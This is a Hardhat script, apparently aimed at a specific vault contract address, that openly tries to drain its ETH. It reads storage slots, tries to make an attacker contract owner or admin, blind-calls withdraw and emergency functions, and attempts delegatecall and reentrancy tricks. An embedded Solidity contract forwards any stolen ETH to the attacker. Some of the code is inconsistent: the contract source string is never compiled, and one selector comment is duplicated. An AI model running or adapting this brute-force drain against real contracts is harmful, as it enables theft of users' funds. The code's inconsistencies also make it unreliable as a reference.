const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

/**
 * @title Storage Manipulation Attack
 * @notice Attempts to manipulate storage slots to enable ETH extraction
 * @dev Focuses on owner/admin slots and withdrawal flags
 */
async function main() {
  console.log("\nüîì STORAGE MANIPULATION ATTACK");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  
  // Initial state
  const initialVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  console.log("Initial vault ETH:", ethers.formatEther(initialVaultETH));
  
  // Read critical storage slots
  console.log("\nüìñ Reading storage slots:");
  
  const slots = [
    { slot: 0, name: "Slot 0 (owner?)" },
    { slot: 1, name: "Slot 1 (implementation)" },
    { slot: 2, name: "Slot 2" },
    { slot: 3, name: "Slot 3" },
    { slot: 4, name: "Slot 4" },
    { slot: 5, name: "Slot 5" },
    // Common admin/owner slots
    { slot: "0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103", name: "Admin slot" },
    { slot: "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc", name: "Implementation slot" },
  ];
  
  for (const { slot, name } of slots) {
    const value = await ethers.provider.getStorage(VAULT_ADDRESS, slot);
    if (value !== "0x0000000000000000000000000000000000000000000000000000000000000000") {
      console.log(`${name}: ${value}`);
    }
  }
  
  // Deploy storage manipulation contract
  console.log("\nüöÄ Deploying storage manipulator...");
  
  const StorageManipulatorCode = `
  pragma solidity ^0.8.0;
  
  contract StorageManipulator {
    address public vault;
    address public owner;
    
    constructor(address _vault) {
      vault = _vault;
      owner = msg.sender;
    }
    
    // Try to become a delegate and manipulate storage
    function manipulateAsDelegate() external {
      // Common patterns to set withdrawal permissions
      assembly {
        // Try to set various "allowed" flags
        sstore(0x10, 1) // Common withdrawal enabled slot
        sstore(0x11, 1) // Emergency mode
        sstore(0x12, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) // Max withdrawal
      }
    }
    
    // Attempt cross-function reentrancy
    function crossFunctionReentrancy() external {
      // Call setOwner while in the middle of another call
      bytes memory data1 = abi.encodeWithSignature("setOwner(address)", address(this));
      bytes memory data2 = abi.encodeWithSignature("withdraw()");
      
      assembly {
        let success1 := call(gas(), sload(0), 0, add(data1, 0x20), mload(data1), 0, 0)
        let success2 := call(gas(), sload(0), 0, add(data2, 0x20), mload(data2), 0, 0)
      }
    }
    
    receive() external payable {
      if (msg.sender == vault) {
        // Received ETH from vault, forward to owner
        payable(owner).transfer(address(this).balance);
      }
    }
    
    function attack() external {
      // Multi-vector attack
      // 1. Try to call withdraw in different contexts
      (bool s1,) = vault.call(abi.encodeWithSignature("withdraw()"));
      (bool s2,) = vault.call(abi.encodeWithSignature("withdrawETH()"));
      (bool s3,) = vault.call(abi.encodeWithSignature("withdraw(uint256)", address(vault).balance));
      
      // 2. Try execute patterns with self as target
      (bool s4,) = vault.call(abi.encodeWithSignature("execute(address,uint256,bytes)", address(this), address(vault).balance, ""));
      
      // 3. Admin withdrawal attempts
      (bool s5,) = vault.call(abi.encodeWithSignature("adminWithdraw()"));
      (bool s6,) = vault.call(abi.encodeWithSignature("emergencyExit()"));
    }
  }`;
  
  const ManipulatorFactory = await ethers.getContractFactory("StorageManipulator");
  const manipulator = await ManipulatorFactory.deploy(VAULT_ADDRESS);
  await manipulator.waitForDeployment();
  const manipulatorAddress = await manipulator.getAddress();
  console.log("Storage manipulator deployed at:", manipulatorAddress);
  
  // First, try to set manipulator as owner/admin
  console.log("\nüéØ Setting manipulator as admin...");
  
  const adminFunctions = [
    { sig: "setOwner(address)", selector: "0x13af4035" },
    { sig: "transferOwnership(address)", selector: "0xf2fde38b" },
    { sig: "setAdmin(address)", selector: "0x8fc866da" },
  ];
  
  for (const { sig, selector } of adminFunctions) {
    try {
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [manipulatorAddress]).slice(2);
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 100000
      });
      await tx.wait();
      console.log(`‚úÖ ${sig} succeeded`);
    } catch (e) {
      console.log(`‚ùå ${sig} failed`);
    }
  }
  
  // Execute storage manipulation
  console.log("\nüîß Executing storage manipulation...");
  
  try {
    await manipulator.manipulateAsDelegate({ gasLimit: 500000 });
    console.log("Storage manipulation attempted");
  } catch (e) {
    console.log("Storage manipulation failed:", e.reason);
  }
  
  try {
    await manipulator.crossFunctionReentrancy({ gasLimit: 500000 });
    console.log("Cross-function reentrancy attempted");
  } catch (e) {
    console.log("Cross-function reentrancy failed:", e.reason);
  }
  
  // Main attack
  console.log("\nüí• Executing main attack...");
  
  try {
    await manipulator.attack({ gasLimit: 2000000 });
    console.log("Attack executed");
  } catch (e) {
    console.log("Attack failed:", e.reason);
  }
  
  // Test withdrawal with manipulated state
  console.log("\nüé∞ Testing withdrawals after manipulation...");
  
  const withdrawalTests = [
    "0x3ccfd60b", // withdraw()
    "0x4782f779", // withdrawETH()
    "0xe9fad8ee", // withdrawETH()
    "0x853828b6", // withdrawAll()
    "0xdb2e21bc", // emergencyWithdraw()
  ];
  
  for (const selector of withdrawalTests) {
    try {
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: selector,
        gasLimit: 500000
      });
      await tx.wait();
      
      const newBalance = await ethers.provider.getBalance(VAULT_ADDRESS);
      if (newBalance < initialVaultETH) {
        console.log(`‚úÖ ${selector} extracted ${ethers.formatEther(initialVaultETH - newBalance)} ETH!`);
        break;
      }
    } catch (e) {}
  }
  
  // Try delegatecall to manipulator
  console.log("\nüîÑ Attempting delegatecall exploit...");
  
  const delegateSelectors = [
    "0x5b34b966", // delegateCall(address,bytes)
    "0x9b2c0c2e", // delegateTo(address,bytes)
  ];
  
  for (const selector of delegateSelectors) {
    try {
      const attackData = manipulator.interface.encodeFunctionData("attack");
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "bytes"],
        [manipulatorAddress, attackData]
      ).slice(2);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 1000000
      });
      await tx.wait();
      console.log(`${selector} executed`);
    } catch (e) {}
  }
  
  // Check balances
  const manipulatorBalance = await ethers.provider.getBalance(manipulatorAddress);
  if (manipulatorBalance > 0n) {
    console.log(`\nüí∞ Manipulator received ${ethers.formatEther(manipulatorBalance)} ETH!`);
  }
  
  // Final check
  const finalVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  const ethExtracted = initialVaultETH > finalVaultETH ? initialVaultETH - finalVaultETH : 0n;
  
  console.log("\nüìä FINAL RESULTS:");
  console.log("=====================================");
  console.log("Initial vault ETH:", ethers.formatEther(initialVaultETH));
  console.log("Final vault ETH:", ethers.formatEther(finalVaultETH));
  console.log("ETH extracted:", ethers.formatEther(ethExtracted));
  
  if (ethExtracted > 0n) {
    console.log("\nüéâ SUCCESS! Storage manipulation enabled ETH extraction!");
  } else {
    console.log("\nüìù Storage manipulation failed to extract ETH");
    console.log("The vault's security appears robust against these attacks");
  }
}

main().catch((error) => {
  console.error("\nüí• Script error:", error);
  process.exit(1);
});
